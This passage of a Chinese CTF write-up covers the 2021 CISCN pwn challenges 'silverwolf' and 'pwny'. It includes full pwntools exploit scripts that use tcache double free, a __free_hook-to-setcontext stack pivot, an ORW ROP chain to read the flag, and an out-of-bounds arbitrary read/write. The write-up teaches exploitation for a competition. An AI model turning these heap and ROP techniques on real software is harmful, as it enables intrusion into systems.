&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        chunk_size = size_1;</span><br><span class="line">        chunk_ptr = ptr;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_1144, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; chunk_ptr )</span><br><span class="line">    <span class="built_in">free</span>(chunk_ptr);<span class="comment">//uaf</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然是堆的ORW那么就需要泄露<code>heap_base</code>和<code>libc_base</code>，泄露<code>heap_base</code>的目的是栈迁移到堆上，并且在堆上布置ROP链，<code>libc_base</code>是为了寻找对应的<code>ROPgadget</code></p><p>因为堆块的结构都是一样的，泄露<code>heap_base</code>和<code>libc_base</code>步骤都差不多，不过还是有点差别，原因在于初始化的时候，申请了很多堆块也free了很多堆块，所以在这就要先把堆块全部申请回来然后再进行<code>double free</code>，当时没有申请回来，也能够正常泄露<code>heap_base</code>和<code>libc_base</code>，但是在后面写的时候写不进去，所以还是搭建和之前那题一样的环境吧！</p><p>和上题一样修改<code>tache bin</code> 的key就能进行<code>double free</code>了，之后直接show就能泄露<code>heap_base</code>了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free()</span><br></pre></td></tr></table></figure><p>之后就是修改<code>tache bin</code>的fd劫持到控制堆块，泄露<code>libc_base</code>，没啥变化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span> + <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p>泄露工作完成之后，就能去找<code>ROPgadget</code>了，记得一定要看清楚….其中一个<code>gadget</code>不知道怎么就找错了，卡了一段时间….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x215bf</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x43ae8</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x23eea</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">syscall = libc_base + <span class="number">0xE5965</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br></pre></td></tr></table></figure><p>之前劫持了控制堆块，这里就开始写它布置我们需要的堆块，<code>heap_base + 0x1000</code>用来放置flag的路径，<code>heap_base + 0x2000</code>和<code>heap_base + 0x20A0</code>是用来栈迁移的，至于为什么是这两个地址，等下就知道了，<code>heap_base + 0x3000</code>和<code>heap_base + 0x3060</code>是用来存我们的ROP链的，因为一个堆块放不下，只能用两个堆块来放</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(free_hook)<span class="comment">#0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>)<span class="comment">#flag #0x30</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>)<span class="comment">#stack #0x40</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20A0</span>)<span class="comment">#stack 0x60</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3000</span>)<span class="comment">#orw1 #0x50</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3060</span>)<span class="comment">#orw2 #0x60</span></span><br><span class="line"><span class="comment"># pasue()</span></span><br><span class="line">edit(payload)</span><br></pre></td></tr></table></figure><p>ROP链和以前的没什么区别，就是注意一下打开和读的位置，至于为什么第一个为什么用的是系统调用，因为read会破坏我们的堆栈结构，所以就用系统调用就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base  + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x30</span>)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(write)</span><br></pre></td></tr></table></figure><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/4.jpg" class="" width="4"><p>下面就是进行参数布置和栈迁移了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(p64(setcontext))<span class="comment">#修改__free_hook为setcontext+53</span></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(p64(heap_base + <span class="number">0x3000</span>)+p64(ret))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p>首先<code>setcontext+53</code>是怎么回事呢？在libc中搜索，就能看到这条gadget，发现只要控制了rdi就能够控制rsp，所以怎么控制rdi呢？这就很巧妙，我们来看下free( )函数，它原本的参数rdi就是堆块的地址对不对，所以当我们劫持它变成<code>setcontext+53</code>的时候，这个rdi就传给了它，所以它就会去[rdi+0A0]的内存处去找，这个位置正正好好就是<code>add(0x58)</code>这个堆块的位置，所以rsp就变成<code>heap_base + 0x3000</code>这个地方，而这个地方存放着我们的ROP链，就一环扣一环，很巧妙…，至于为什么要加一个ret，看图中是不是push了rcx，防止它破坏栈结构把它弹出来</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/5.jpg" class=""><p>接下来调试看看</p><p>此时的<code>free</code>已经被劫持进了<code>setcontext+53</code></p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/6.png" class=""><p>0x56222468d000就是**add(0x48)<strong>之后的地址，它加A0的位置就是</strong>p64(heap_base + 0x3000)+p64(ret)**的位置</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/7.png" class=""><p>此时的rsp已经到了我们的ROP链，可以看到第一条命令是POP rdi，没毛病！</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/8.jpg" class=""><p>完成ROP链的调用之后，就得到了<code>flag</code></p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/9.png" class=""><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;silverwolf&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;silverwolf&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">success(<span class="string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span> + <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x215bf</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x43ae8</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x23eea</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">syscall = libc_base + <span class="number">0xE5965</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0,0x240)</span></span><br><span class="line">payload = <span class="string">&#x27;\x02&#x27;</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(free_hook)<span class="comment">#0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>)<span class="comment">#flag #0x30</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>)<span class="comment">#stack #0x40</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20A0</span>)<span class="comment">#stack 0x60</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3000</span>)<span class="comment">#orw1 #0x50</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x3060</span>)<span class="comment">#orw2 #0x60</span></span><br><span class="line"><span class="comment"># pasue()</span></span><br><span class="line">edit(payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">orw = p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base  + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x20</span>)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(p64(heap_base + <span class="number">0x3000</span>)+p64(ret))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">free()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h3><p>在初始化函数中<code>open</code>了一个文件，并将把<code>fd</code>存起来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_A10</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  result = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  fd = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>write</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_BA0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 index; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br><span class="line">  index = v2;</span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  read(fd, &amp;v2, <span class="number">8uLL</span>);</span><br><span class="line">  qword_202060[index] = v2;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_B20</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  read(fd, &amp;v1, <span class="number">8uLL</span>);</span><br><span class="line">  printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Result: %lx\n&quot;</span>, qword_202060[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于一开始的文件描述符是随机数，所以<code>read</code>直接报错退出很正常，我们通过<code>write</code>函数来覆盖fd（并没有限制索引的范围），但是第一次<code>read</code>的时候，由于第一次fd的是奇奇怪怪的数字，所以第一次读的时候会失败，但是会把fd覆盖成0，第二次读的时候就能成功读了</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/14.jpg" class=""><p>之后就能通过索引任意读写了，但是需要注意的是索引要以<code>QWORD</code>字节对齐来索引，往上翻有很多东西可以泄露<code>libc</code>，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.got:0000000000201F98 puts_ptr        dq offset puts</span><br><span class="line">.got:0000000000201FD0 exit_ptr        dq offset exit</span><br><span class="line">.got:0000000000201FA8 read_ptr        dq offset read</span><br><span class="line">.bss:0000000000202020 stdout          dq ?</span><br><span class="line">.bss:0000000000202040 stderr          dq ?</span><br></pre></td></tr></table></figure><p>计算方法就是<code>（0x202020 - 0x202060）/ 8</code>就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read_s(p64(0xFFFFFFFFFFFFFFF8))</span><br><span class="line">io.recvuntil(&quot;Result: &quot;)</span><br><span class="line">libc_base = int(io.recvuntil(&#x27;\n&#x27;,drop = True),16) - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]</span><br></pre></td></tr></table></figure><p>由于程序开了PIE，所以我们还得泄露<code>qword_202060</code>在运行时的地址，这里用<code>sub_9c0</code>来泄露，好多师傅用下面这条来泄露，原理都是一样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202008 off_202008      dq offset off_202008</span><br></pre></td></tr></table></figure><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/15.jpg" class=""><p>泄露完前面这些地址之后有三种做法：</p><h4 id="劫持栈的返回地址"><a href="#劫持栈的返回地址" class="headerlink" title="劫持栈的返回地址"></a>劫持栈的返回地址</h4><p>之后就是泄露栈地址，栈地址简单粗暴</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">environ = libc_base + libc.sym[&#x27;environ&#x27;]</span><br><span class="line">print(hex(environ))</span><br><span class="line"></span><br><span class="line">read_s(p64((environ-bss_addr)//8))</span><br><span class="line">io.recvuntil(&quot;Result: &quot;)</span><br><span class="line">stack = int(io.recvuntil(&#x27;\n&#x27;,drop = True),16) -0x120</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 